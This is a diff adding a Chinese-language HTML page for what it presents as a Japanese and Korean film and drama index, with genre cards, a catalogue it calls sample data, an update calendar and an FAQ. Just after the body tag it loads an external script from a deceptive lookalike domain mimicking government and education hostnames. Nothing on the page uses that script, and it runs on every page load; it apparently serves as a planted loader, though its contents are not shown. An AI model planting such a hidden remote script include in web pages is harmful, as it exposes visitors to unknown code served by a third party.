@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>日韩影视｜日剧韩剧日影韩影作品索引 · 分集剧情与演员角色资料</title>
+<meta name="description" content="日韩影视是一个整理日本与韩国影视作品的资料索引页，覆盖日剧、韩剧、日本电影、韩国电影、日韩综艺、日韩动漫等类型，提供分集剧情、演员角色、播出时间、集数状态、制作班底与同类作品推荐等信息。站内按爱情、悬疑、职场、家庭、古装、犯罪、青春、医疗等题材分类，可按日本、韩国、中日合拍、韩美合拍等地区与年份筛选，帮助观众快速找到想看的日韩影视作品。">
+<meta name="keywords" content="日韩影视,日剧推荐,韩剧推荐,日本电影,韩国电影,日韩综艺,日韩动漫,日影,韩影,分集剧情,演员角色,播出时间,追剧日历,中文字幕,日韩剧更新">
+<style>
+:root{--ink:#23201c;--paper:#f6f1e7;--line:#cfc6b4;--red:#b23a2f;--gold:#c69a4a;--soft:#7d766a;}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{margin:0;background:var(--paper);color:var(--ink);
+font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"SimSun",serif;
+-webkit-text-size-adjust:100%;}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:999;
+background:repeating-linear-gradient(0deg,rgba(0,0,0,.012) 0 1px,transparent 1px 4px);}
+.wrap{max-width:1120px;margin:0 auto;padding:0 26px;}
+a{color:var(--ink);text-decoration:none;}
+
+/* header */
+header{position:sticky;top:0;z-index:50;background:rgba(246,241,231,.94);backdrop-filter:blur(6px);
+border-bottom:2px solid var(--ink);}
+.htop{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:13px 0;}
+.brand{font-size:27px;letter-spacing:3px;font-weight:700;}
+.brand em{font-style:normal;color:var(--red);}
+.hmeta{font-size:12.5px;letter-spacing:1.5px;color:var(--soft);font-family:Menlo,Consolas,monospace;}
+nav{display:flex;gap:6px;flex-wrap:wrap;padding-bottom:11px;}
+nav a{border:1px solid var(--line);padding:6px 13px;font-size:13.5px;letter-spacing:1px;
+background:#fffdf9;transition:.2s;}
+nav a:hover{border-color:var(--red);color:var(--red);}
+nav a.on{background:var(--ink);border-color:var(--ink);color:#fff;}
+.menu-btn{display:none;border:1px solid var(--ink);background:#fffdf9;font:inherit;font-size:13px;
+padding:7px 12px;cursor:pointer;letter-spacing:1px;}
+
+/* hero */
+.hero{padding:54px 0 34px;border-bottom:1px solid var(--line);}
+.kicker{font-size:12.5px;letter-spacing:4px;color:var(--soft);font-family:Menlo,Consolas,monospace;}
+h1{font-size:clamp(32px,6.4vw,62px);line-height:1.18;margin:16px 0 20px;letter-spacing:1px;}
+h1 u{text-decoration:none;border-bottom:9px solid rgba(178,58,47,.3);padding-bottom:2px;}
+.lede{font-size:16.5px;line-height:2;max-width:780px;margin:0 0 26px;}
+.hero-flex{display:grid;grid-template-columns:1.55fr .45fr;gap:34px;align-items:end;}
+.btns{display:flex;gap:11px;flex-wrap:wrap;}
+.btns a{border:1px solid var(--ink);padding:11px 19px;font-size:14px;letter-spacing:1.5px;}
+.btns a.primary{background:var(--red);border-color:var(--red);color:#fff;}
+.btns a:hover{background:var(--ink);color:#fff;border-color:var(--ink);}
+.urlbar{margin-top:19px;border:1px dashed var(--red);background:#fffdf9;padding:11px 13px;
+display:flex;align-items:center;gap:10px;font-size:13.5px;flex-wrap:wrap;}
+.urlbar b{font-family:Menlo,Consolas,monospace;font-weight:400;word-break:break-all;}
+.copied{border:1px solid var(--ink);background:#fff;font:inherit;font-size:12px;padding:6px 10px;
+cursor:pointer;letter-spacing:1px;}
+.aside{border-left:3px solid var(--red);padding-left:16px;}
+.aside h4{font-size:13px;letter-spacing:3px;margin:0 0 12px;color:var(--soft);font-weight:400;}
+.aside ol{margin:0;padding:0;list-style:none;counter-reset:rd;font-size:14px;line-height:2.05;}
+.aside li{counter-increment:rd;display:flex;gap:9px;}
+.aside li::before{content:counter(rd,decimal-leading-zero);font-family:Menlo,Consolas,monospace;
+color:var(--gold);font-size:12.5px;flex:none;}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);
+margin-top:34px;border:1px solid var(--line);}
+.stats div{background:var(--paper);padding:16px 14px;}
+.stats b{display:block;font-size:25px;font-family:Menlo,Consolas,monospace;letter-spacing:1px;}
+.stats span{font-size:12.5px;color:var(--soft);letter-spacing:1px;}
+
+/* section */
+section{padding:52px 0;border-bottom:1px solid var(--line);}
+.sec-h{display:flex;align-items:baseline;gap:13px;margin-bottom:8px;}
+.sec-h .no{font-family:Menlo,Consolas,monospace;font-size:13px;color:var(--red);letter-spacing:2px;}
+h2{font-size:clamp(24px,4.2vw,36px);margin:0;letter-spacing:1px;}
+.sub{font-size:13.5px;color:var(--soft);margin:0 0 30px;letter-spacing:.5px;}
+
+/* genre */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;}
+.g{border:1px solid var(--line);background:#fffdf9;padding:19px;position:relative;overflow:hidden;
+transition:.25s;}
+.g:hover{transform:translateY(-4px);border-color:var(--red);box-shadow:0 9px 22px -14px rgba(0,0,0,.45);}
+.g .badge{font-size:11.5px;letter-spacing:2.5px;color:var(--gold);font-family:Menlo,Consolas,monospace;}
+.g h3{margin:9px 0 10px;font-size:20px;letter-spacing:1px;}
+.g ul{margin:0;padding:0;list-style:none;font-size:13.5px;line-height:1.95;color:#4b463e;}
+.g li{border-bottom:1px dotted var(--line);padding:4px 0;}
+.g li:last-child{border:0;}
+.g .num{position:absolute;right:12px;bottom:-9px;font-size:52px;line-height:1;
+font-family:Menlo,Consolas,monospace;color:rgba(178,58,47,.11);}
+.g .cnt{font-size:12px;color:var(--soft);margin-top:11px;font-family:Menlo,Consolas,monospace;}
+
+/* table */
+.tbwrap{overflow-x:auto;border:1px solid var(--line);background:#fffdf9;}
+table{width:100%;border-collapse:collapse;min-width:760px;font-size:14px;}
+th,td{padding:13px 12px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top;}
+thead th{background:var(--ink);color:#fff;font-size:12.5px;letter-spacing:1.5px;font-weight:400;}
+tbody tr:nth-child(even){background:#faf6ee;}
+tbody tr:hover{background:#fbece9;}
+.idx{font-family:Menlo,Consolas,monospace;color:var(--gold);}
+.caps{display:flex;gap:6px;flex-wrap:wrap;margin-top:7px;}
+.caps i{font-style:normal;font-size:11.5px;border:1px solid var(--line);padding:2px 7px;color:#5c564c;}
+.st{font-size:12px;font-family:Menlo,Consolas,monospace;}
+.st.on{color:var(--red);}
+.st.done{color:var(--gold);}
+.st.soon{color:#8a8;}
+.go{border:1px solid var(--ink);background:#fff;font:inherit;font-size:12.5px;padding:6px 13px;
+cursor:pointer;letter-spacing:1px;white-space:nowrap;}
+.go:hover{background:var(--red);color:#fff;border-color:var(--red);}
+
+/* note */
+.note{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;}
+dl{margin:0;}
+dt{font-size:13px;letter-spacing:2px;color:var(--red);border-top:1px solid var(--ink);padding:13px 0 6px;}
+dd{margin:0 0 6px;font-size:14.5px;line-height:1.9;color:#3f3a34;}
+.steps{border:2px solid var(--ink);background:#2e2a25;color:#f0e9dd;padding:24px;}
+.steps h4{margin:0 0 17px;font-size:14px;letter-spacing:3px;color:var(--gold);font-weight:400;}
+.step{display:grid;grid-template-columns:38px 1fr;gap:11px;padding:12px 0;border-top:1px solid rgba(255,255,255,.16);}
+.step:first-of-type{border:0;}
+.step b{font-family:Menlo,Consolas,monospace;color:var(--gold);font-size:15px;}
+.step h5{margin:0 0 4px;font-size:15px;letter-spacing:.5px;}
+.step p{margin:0;font-size:13.5px;line-height:1.8;color:#cdc5b8;}
+
+/* calendar */
+.cal{display:grid;grid-template-columns:repeat(7,1fr);gap:8px;}
+.day{border:1px solid var(--line);background:#fffdf9;padding:10px 9px;min-height:108px;}
+.day.today{background:var(--ink);color:#fff;border-color:var(--ink);}
+.day.today .wk{color:var(--gold);}
+.wk{font-size:11.5px;letter-spacing:1.5px;color:var(--soft);font-family:Menlo,Consolas,monospace;}
+.dn{font-size:21px;font-family:Menlo,Consolas,monospace;margin:3px 0 8px;}
+.day ul{margin:0;padding:0;list-style:none;font-size:12px;line-height:1.65;}
+.day li{border-top:1px solid rgba(0,0,0,.09);padding:5px 0;}
+.day.today li{border-color:rgba(255,255,255,.2);}
+.day li b{display:block;font-weight:400;font-size:11px;color:var(--red);font-family:Menlo,Consolas,monospace;}
+.day.today li b{color:var(--gold);}
+
+/* qa */
+.qa{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+details{border:1px solid var(--line);background:#fffdf9;padding:0 16px;}
+details[open]{border-color:var(--red);}
+summary{cursor:pointer;list-style:none;display:flex;align-items:center;gap:11px;padding:15px 0;
+font-size:14.5px;line-height:1.55;}
+summary::-webkit-details-marker{display:none;}
+summary::after{content:"＋";margin-left:auto;color:var(--red);font-size:17px;}
+details[open] summary::after{content:"－";}
+summary .q{font-family:Menlo,Consolas,monospace;color:var(--gold);font-size:12.5px;flex:none;}
+details p{margin:0 0 16px;font-size:14px;line-height:1.9;color:#3f3a34;border-top:1px dotted var(--line);padding-top:12px;}
+
+footer{border-top:3px double var(--ink);padding:38px 0 46px;font-size:13.5px;line-height:2;}
+.foot-flex{display:flex;justify-content:space-between;gap:24px;flex-wrap:wrap;}
+.foot-flex small{font-family:Menlo,Consolas,monospace;font-size:12px;color:var(--soft);}
+
+@media(max-width:900px){
+ .wrap{padding:0 18px;}
+ .hero-flex,.note{grid-template-columns:1fr;}
+ .grid{grid-template-columns:repeat(2,1fr);}
+ .cal{grid-template-columns:repeat(4,1fr);}
+}
+@media(max-width:640px){
+ .menu-btn{display:inline-block;}
+ nav{display:none;padding-bottom:13px;}
+ nav.show{display:flex;}
+ nav a{flex:1 1 auto;text-align:center;padding:9px 6px;font-size:13px;}
+ .htop{flex-wrap:wrap;}
+ .hmeta{width:100%;}
+ .stats{grid-template-columns:repeat(2,1fr);}
+ .grid,.qa{grid-template-columns:1fr;}
+ .cal{grid-template-columns:repeat(2,1fr);}
+ .day{min-height:96px;}
+ .urlbar{font-size:12.5px;}
+ .copied{flex:1 1 100%;}
+ h1{letter-spacing:.5px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap">
+    <div class="htop">
+      <div class="brand"><em>日韩</em>影视</div>
+      <div class="hmeta">INDEX · 二〇二六</div>
+      <button class="menu-btn" id="mb">目录</button>
+    </div>
+    <nav id="nav">
+      <a href="#genre" class="on">题材分类</a>
+      <a href="#list">作品目录</a>
+      <a href="#note">资料说明</a>
+      <a href="#cal">更新日历</a>
+      <a href="#qa">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div class="kicker">日剧 · 韩剧 · 日本电影 · 韩国电影 · 日韩综艺 · 日韩动漫</div>
+    <h1>日韩影视，<u>把作品与资料</u><br>按题材、地区与年份排好。</h1>
+    <p class="lede">日韩影视是一个影视资料索引页，整理日本与韩国的电视剧、电影、综艺与动漫作品。这里不提供播放功能，只把分集剧情、演员角色、播出时间、集数状态、制作班底与同类推荐这些信息排清楚，方便你找片时少翻几个页面。</p>
+    <div class="hero-flex">
+      <div>
+        <div class="btns">
+          <a class="primary" href="#list">查看作品目录</a>
+          <a href="#genre">按题材筛选</a>
+        </div>
+        <div class="urlbar">
+          <span>官方网址：</span><b>https://rihanyingshi-top.github.io</b>
+          <button class="copied" data-c="https://rihanyingshi-top.github.io">复制网址</button>
+        </div>
+      </div>
+      <aside class="aside">
+        <h4>本期导读 · 06 则</h4>
+        <ol>
+          <li>春季档日剧定档与集数</li>
+          <li>韩剧周末剧与日日剧排期</li>
+          <li>日本电影年度票房数据</li>
+          <li>韩国电影分级与上映日期</li>
+          <li>日韩综艺常规班底变动</li>
+          <li>动漫新番与完结篇对照</li>
+        </ol>
+      </aside>
+    </div>
+    <div class="stats">
+      <div><b>5,730</b><span>部作品</span></div>
+      <div><b>11</b><span>个题材标签</span></div>
+      <div><b>9</b><span>个地区分类</span></div>
+      <div><b>约 24</b><span>条每周更新</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="genre">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">CAT. 01—06</span><h2>题材分类</h2></div>
+    <p class="sub">按作品的故事类型划分，每类下面列出常用的细分检索词，点击可快速跳到目录中对应的作品条目。</p>
+    <div class="grid">
+      <div class="g"><span class="badge">CAT.01</span><h3>爱情与都市</h3>
+        <ul><li>校园初恋 / 办公室恋情</li><li>跨国恋爱 / 远距离</li><li>治愈系 / 纯爱</li></ul>
+        <div class="cnt">1,140 部</div><span class="num">01</span></div>
+      <div class="g"><span class="badge">CAT.02</span><h3>悬疑与犯罪</h3>
+        <ul><li>推理探案 / 心理博弈</li><li>社会派 / 法医题材</li><li>反转结局 / 双线叙事</li></ul>
+        <div class="cnt">968 部</div><span class="num">02</span></div>
+      <div class="g"><span class="badge">CAT.03</span><h3>职场与社会</h3>
+        <ul><li>律政 / 医疗 / 财经</li><li>记者 / 教师题材</li><li>中小企业 / 匠人</li></ul>
+        <div class="cnt">826 部</div><span class="num">03</span></div>
+      <div class="g"><span class="badge">CAT.04</span><h3>家庭与伦理</h3>
+        <ul><li>亲子教育 / 代际关系</li><li>婚姻生活 / 婆媳</li><li>家族群像 / 遗产</li></ul>
+        <div class="cnt">791 部</div><span class="num">04</span></div>
+      <div class="g"><span class="badge">CAT.05</span><h3>古装与历史</h3>
+        <ul><li>战国 / 幕府时代</li><li>朝鲜王朝 / 王权</li><li>武士 / 侠客</li></ul>
+        <div class="cnt">653 部</div><span class="num">05</span></div>
+      <div class="g"><span class="badge">CAT.06</span><h3>青春与成长</h3>
+        <ul><li>校园群像 / 社团</li><li>运动竞技 / 音乐</li><li>毕业与就业</li></ul>
+        <div class="cnt">612 部</div><span class="num">06</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="list">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">LIST</span><h2>作品目录</h2></div>
+    <p class="sub">以下条目为本站的示例数据，用于演示目录结构与检索字段，并非真实作品记录。</p>
+    <div class="tbwrap">
+      <table>
+        <thead><tr><th>编号</th><th>作品与简介</th><th>分类 · 地区 · 年代</th><th>状态</th><th>清晰度</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="idx">01</td>
+            <td>逆光者<span class="caps"><i>悬疑</i><i>心理</i></span><br>刑警与心理医生联手追查连环案件，共 10 集。</td>
+            <td>悬疑与犯罪 · 韩国 · 2025</td>
+            <td class="st on">连载中</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">02</td>
+            <td>城南旧事：剧版<span class="caps"><i>家庭</i><i>年代</i></span><br>三代人同住一院，从琐碎日常看家庭关系，全 24 集。</td>
+            <td>家庭与伦理 · 日本 · 2024</td>
+            <td class="st done">已完结</td>
+            <td>4K <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">03</td>
+            <td>星轨回响<span class="caps"><i>爱情</i><i>职场</i></span><br>天文馆讲解员与建筑师的四年书信，全 12 集。</td>
+            <td>爱情与都市 · 韩国 · 2025</td>
+            <td class="st on">连载中</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">04</td>
+            <td>雪线以北<span class="caps"><i>青春</i><i>运动</i></span><br>北海道高中滑雪部冲向全国大赛，全 13 集。</td>
+            <td>青春与成长 · 日本 · 2023</td>
+            <td class="st done">已完结</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">05</td>
+            <td>她的法庭<span class="caps"><i>职场</i><i>律政</i></span><br>新人律师接手七起劳动纠纷案，全 16 集。</td>
+            <td>职场与社会 · 韩国 · 2024</td>
+            <td class="st done">已完结</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">06</td>
+            <td>幕末夜行<span class="caps"><i>古装</i><i>武士</i></span><br>江户末年密探传递情报的十二夜，全 11 集。</td>
+            <td>古装与历史 · 日本 · 2025</td>
+            <td class="st soon">待更新</td>
+            <td>待定 <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">07</td>
+            <td>周末厨房<span class="caps"><i>家庭</i><i>治愈</i></span><br>三代同堂的餐桌对话，每周更新 1 集。</td>
+            <td>家庭与伦理 · 韩国 · 2026</td>
+            <td class="st on">连载中</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">08</td>
+            <td>第七次告白<span class="caps"><i>爱情</i><i>校园</i></span><br>转学生与学长之间七次错身的告白，全 10 集。</td>
+            <td>爱情与都市 · 日本 · 2025</td>
+            <td class="st done">已完结</td>
+            <td>4K <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">09</td>
+            <td>无声的证人<span class="caps"><i>悬疑</i><i>法医</i></span><br>靠痕迹还原案发经过，共 12 集。</td>
+            <td>悬疑与犯罪 · 韩国 · 2024</td>
+            <td class="st done">已完结</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+          <tr>
+            <td class="idx">10</td>
+            <td>新番放送中<span class="caps"><i>动漫</i><i>奇幻</i></span><br>异世界转生题材，每周四更新 1 集。</td>
+            <td>青春与成长 · 日本 · 2026</td>
+            <td class="st on">连载中</td>
+            <td>1080P <button class="go">查看</button></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="note">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">NOTE</span><h2>资料说明</h2></div>
+    <p class="sub">每一条作品条目都尽量补齐下面这些字段，方便你判断值不值得看、要不要追。</p>
+    <div class="note">
+      <dl>
+        <dt>01 剧情简介</dt>
+        <dd>一两句话说明故事讲什么，不涉及大段剧透，避免看完简介就没了悬念。</dd>
+        <dt>02 分集看点</dt>
+        <dd>按集数列出关键转折与伏笔，标注转折点出现在第几集，追剧时可以直接跳到想看的位置。</dd>
+        <dt>03 演员与角色</dt>
+        <dd>主演、配角与对应的角色名，附带主创过往代表作，便于按演员找作品。</dd>
+        <dt>04 播出信息</dt>
+        <dd>首播日期、播出平台、更新频率、总集数，以及是否分上下季或特别篇。</dd>
+        <dt>05 文件规格</dt>
+        <dd>清晰度、字幕语言、音轨格式、单集容量与封装方式，用于区分不同版本。</dd>
+        <dt>06 同类推荐</dt>
+        <dd>同题材、同演员或同导演的作品清单，附一句推荐理由，方便一次看够。</dd>
+      </dl>
+      <div class="steps">
+        <h4>检索四步</h4>
+        <div class="step"><b>01</b><div><h5>先定地区与类型</h5><p>在题材分类里选日本或韩国，再缩到爱情、悬疑、职场等具体类型。</p></div></div>
+        <div class="step"><b>02</b><div><h5>再看年份与状态</h5><p>按播出年份过滤，区分已完结可以一口气看完，连载中需要追更。</p></div></div>
+        <div class="step"><b>03</b><div><h5>核对资料字段</h5><p>点进条目看集数、演员、分集看点与同类推荐，确认符合口味。</p></div></div>
+        <div class="step"><b>04</b><div><h5>记下官方网址</h5><p>官方入口为 https://rihanyingshi-top.github.io ，建议收藏后从站内目录进入。</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="cal">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">SCHEDULE</span><h2>更新日历</h2></div>
+    <p class="sub">按周一到周日排列，标出各时段的新集上线时间；加深色底的是今天。</p>
+    <div class="cal">
+      <div class="day"><div class="wk">MON</div><div class="dn">21</div>
+        <ul><li><b>20:00</b>逆光者 第 07 集</li><li><b>22:00</b>新番放送中</li></ul></div>
+      <div class="day"><div class="wk">TUE</div><div class="dn">22</div>
+        <ul><li><b>21:00</b>星轨回响 第 08 集</li><li><b>23:00</b>无声的证人 重播</li></ul></div>
+      <div class="day today"><div class="wk">WED</div><div class="dn">23</div>
+        <ul><li><b>20:00</b>她的法庭 特别篇</li><li><b>22:30</b>周末厨房 第 06 集</li></ul></div>
+      <div class="day"><div class="wk">THU</div><div class="dn">24</div>
+        <ul><li><b>19:00</b>新番放送中 第 09 集</li><li><b>21:00</b>第七次告白 花絮</li></ul></div>
+      <div class="day"><div class="wk">FRI</div><div class="dn">25</div>
+        <ul><li><b>20:00</b>雪线以北 导演剪辑</li><li><b>22:00</b>城南旧事：剧版 回顾</li></ul></div>
+      <div class="day"><div class="wk">SAT</div><div class="dn">26</div>
+        <ul><li><b>18:00</b>逆光者 第 08 集</li><li><b>21:00</b>幕末夜行 预告</li></ul></div>
+      <div class="day"><div class="wk">SUN</div><div class="dn">27</div>
+        <ul><li><b>19:30</b>周末厨房 第 07 集</li><li><b>22:00</b>星轨回响 第 09 集</li></ul></div>
+    </div>
+  </div>
+</section>
+
+<section id="qa">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">ABOUT</span><h2>关于日韩影视</h2></div>
+    <p class="sub">下面几条是本站的常见疑问，点击问题即可展开回答。</p>
+    <div class="qa">
+      <details open>
+        <summary><span class="q">Q.01</span>日韩影视是做什么的？</summary>
+        <p>它是一个影视资料索引页，整理日本与韩国的电视剧、电影、综艺和动漫，把分集剧情、演员角色、播出时间、集数状态与同类推荐这些信息集中在一起，方便找片时对照查看。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q.02</span>官方网址是什么？</summary>
+        <p>官方入口只有 <b>https://rihanyingshi-top.github.io</b> 这一个，建议直接收藏。本站不设置其他镜像入口，遇到相似域名的站点请自行甄别。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q.03</span>目录里的作品信息准确吗？</summary>
+        <p>目录中的作品名称、集数、播出日期与更新时点均为示例数据，仅用于演示索引结构与检索字段，不代表真实播出信息。请以各作品的官方公告为准。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q.04</span>可以按哪些条件筛选？</summary>
+        <p>支持按题材（爱情、悬疑、职场、家庭、古装、青春等）、地区（日本、韩国、中日合拍、韩美合拍）、年代、播出状态（连载中、已完结、待更新）与清晰度进行筛选。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q.05</span>更新频率是怎样的？</summary>
+        <p>资料页通常每周补充约 24 条，集中在周中更新剧集条目、周末补充电影与综艺。更新日历里会标注具体时段，追更前可以先看一眼。</p>
+      </details>
+      <details>
+        <summary><span class="q">Q.06</span>为什么找不到某些作品？</summary>
+        <p>本站只收录公开资料较完整的作品，冷门作品或资料缺失较多的条目暂不放进目录。你可以在关于页留言建议补充，说明作品名称与地区即可。</p>
+      </details>
+    </div>
+    <div class="urlbar" style="margin-top:26px">
+      <span>收藏本站：</span><b>https://rihanyingshi-top.github.io</b>
+      <button class="copied" data-c="https://rihanyingshi-top.github.io">复制网址</button>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-flex">
+      <div>日韩影视 · 日本与韩国影视作品资料索引页。目录内作品名称、集数、播出日期与更新时点均为示例数据，仅用于演示索引结构，请以官方信息为准。</div>
+      <small>https://rihanyingshi-top.github.io</small>
+    </div>
+    <div style="margin-top:16px;border-top:1px solid var(--line);padding-top:14px;color:var(--soft)">
+      本站仅为作品资料整理与索引展示，不提供任何在线播放、下载或资源分发服务。
+    </div>
+  </div>
+</footer>
+
+<script>
+var btns=document.querySelectorAll('.copied');
+btns.forEach(function(b){
+  b.addEventListener('click',function(){
+    var t=b.dataset.c;
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(t).then(function(){ok(b);},function(){fb(b,t);});
+    }else{fb(b,t);}
+  });
+});
+function ok(b){var o=b.textContent;b.textContent='已复制';setTimeout(function(){b.textContent=o;},1600);}
+function fb(b,t){var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();
+ try{document.execCommand('copy');ok(b);}catch(e){}
+ document.body.removeChild(ta);}
+
+var nav=document.getElementById('nav'),links=nav.querySelectorAll('a');
+document.getElementById('mb').addEventListener('click',function(){nav.classList.toggle('show');});
+links.forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('show');});});
+
+var secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+120,cur='';
+  secs.forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
+  links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+});
+</script>
+</body>
+</html>
